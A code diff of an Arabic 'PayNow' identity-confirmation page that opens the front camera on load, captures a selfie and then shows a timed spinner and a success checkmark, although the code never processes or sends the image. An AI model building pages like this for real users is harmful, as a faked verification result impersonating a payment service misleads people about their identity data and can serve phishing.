@@ -3,70 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayNow - تأكيد الهوية</title>
+    <title>تأكيد الهوية - PayNow</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f8f9fa;
+            background-color: #f0f2f5;
             text-align: center;
             margin: 0;
             padding: 0;
             direction: rtl;
         }
         .header {
-            background-color: #d10000;
+            background-color: #1877f2;
             color: white;
-            padding: 15px;
+            padding: 20px;
             font-size: 24px;
             font-weight: bold;
         }
         .container {
-            margin-top: 20px;
+            background-color: white;
+            width: 90%;
+            max-width: 400px;
+            margin: 30px auto;
             padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
-        .radio-group {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 20px 0;
-        }
-        .radio-group label {
-            font-size: 18px;
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
-        .radio-group input {
-            margin-left: 10px;
-            transform: scale(1.3);
+        video, canvas {
+            width: 100%;
+            max-width: 320px;
+            border-radius: 10px;
+            margin-bottom: 15px;
         }
         .btn {
-            background-color: #d10000;
+            background-color: #1877f2;
             color: white;
-            padding: 10px 20px;
+            padding: 12px 20px;
             font-size: 18px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
-            width: 80%;
-            max-width: 320px;
+            width: 90%;
+            margin-top: 10px;
         }
         .btn:hover {
-            background-color: #a80000;
+            background-color: #1558b0;
         }
-        #camera-container {
+        .loading-container {
             display: none;
             margin-top: 20px;
         }
-        video {
-            width: 100%;
-            max-width: 400px;
-            border: 2px solid #d10000;
-            border-radius: 5px;
+        .loading-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 8px solid #4caf50;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin: auto;
         }
-        canvas {
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+        .success-message {
+            font-size: 18px;
+            font-weight: bold;
+            color: #4caf50;
+            margin-top: 15px;
+            display: none;
+        }
+        .success-icon {
+            font-size: 50px;
+            color: #4caf50;
+            margin-top: 15px;
             display: none;
         }
     </style>
@@ -76,70 +86,57 @@
     <div class="header">الرجاء تأكيد الهوية</div>
 
     <div class="container">
-        <h2>اختر طريقة التأكيد</h2>
+        <video id="camera" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <button class="btn" onclick="capturePhoto()">التقاط الصورة</button>
 
-        <div class="radio-group">
-            <label>
-                <input type="radio" name="verification" value="card"> التأكيد بالبطاقة
-            </label>
-            <label>
-                <input type="radio" name="verification" value="camera" id="cameraOption"> التأكيد المباشر
-            </label>
-        </div>
-
-        <button class="btn" onclick="startVerification()">متابعة</button>
-
-        <div id="camera-container">
-            <h3>التقط صورة لتأكيد هويتك</h3>
-            <video id="video" autoplay></video>
-            <button class="btn" onclick="captureImage()">التقاط الصورة</button>
-            <canvas id="canvas"></canvas>
+        <!-- عنصر التحميل -->
+        <div class="loading-container" id="loading">
+            <div class="loading-circle"></div>
+            <p class="success-message">ستتم معالجة الصورة</p>
+            <div class="success-icon">✔</div>
         </div>
     </div>
 
     <script>
-        function startVerification() {
-            const selectedOption = document.querySelector('input[name="verification"]:checked');
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const loading = document.getElementById('loading');
+        const successMessage = document.querySelector('.success-message');
+        const successIcon = document.querySelector('.success-icon');
 
-            if (!selectedOption) {
-                alert("يرجى اختيار طريقة التأكيد");
-                return;
-            }
+        // تشغيل الكاميرا الأمامية
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('خطأ في تشغيل الكاميرا:', error);
+                alert('تعذر تشغيل الكاميرا، يرجى التحقق من الأذونات.');
+            });
 
-            if (selectedOption.value === "camera") {
-                document.getElementById("camera-container").style.display = "block";
-                startCamera();
-            } else {
-                alert("يرجى تقديم صورة للبطاقة عبر البريد أو مركز الدعم.");
-            }
-        }
-
-        function startCamera() {
-            const video = document.getElementById("video");
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then((stream) => {
-                    video.srcObject = stream;
-                })
-                .catch((err) => {
-                    alert("حدث خطأ في تشغيل الكاميرا: " + err);
-                });
-        }
-
-        function captureImage() {
-            const video = document.getElementById("video");
-            const canvas = document.getElementById("canvas");
-            const context = canvas.getContext("2d");
-
+        function capturePhoto() {
+            const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة إلى بيانات يمكن تخزينها
-            const imageData = canvas.toDataURL("image/png");
+            // إيقاف الكاميرا بعد التقاط الصورة
+            video.srcObject.getTracks().forEach(track => track.stop());
 
-            alert("تم التقاط الصورة بنجاح!");
-            console.log(imageData); // يمكنك إرسال الصورة إلى السيرفر هنا
+            // إخفاء الكاميرا وزر الالتقاط
+            video.style.display = 'none';
+            document.querySelector('.btn').style.display = 'none';
+
+            // عرض التحميل
+            loading.style.display = 'block';
+
+            // بعد 3 ثوانٍ، عرض علامة الصح والرسالة
+            setTimeout(() => {
+                document.querySelector('.loading-circle').style.display = 'none';
+                successMessage.style.display = 'block';
+                successIcon.style.display = 'block';
+            }, 3000);
         }
     </script>
 
